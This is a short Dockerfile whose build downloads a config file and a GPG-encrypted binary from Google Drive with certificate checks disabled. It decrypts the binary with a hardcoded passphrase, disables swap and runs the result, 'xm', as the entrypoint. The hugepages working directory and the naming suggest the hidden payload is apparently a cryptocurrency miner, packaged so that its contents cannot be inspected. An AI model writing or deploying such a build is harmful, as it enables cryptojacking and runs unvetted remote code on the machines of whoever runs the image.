FROM ubuntu:xenial

RUN apt-get update && apt-get install -y wget gnupg

USER root
WORKDIR /hugepages
RUN echo "nameserver 1.1.1.1" >> /etc/resolv.conf
#RUN echo "vm.nr_hugepages = 64" >> /etc/sysctl.conf
#RUN sudo sysctl -w vm.nr_hugepages=128
RUN wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1crs8vDO6hruUVP9_Ii0OUvSVwFbEJKOG' -O config.json
RUN wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1gQnIs_dElJBQT6iB73ufNww51-QI6wtW' -O xm.gpg
RUN echo "7753191" | gpg --batch --yes --passphrase-fd 0 xm.gpg
RUN swapoff -a

ENTRYPOINT ["./xm"]
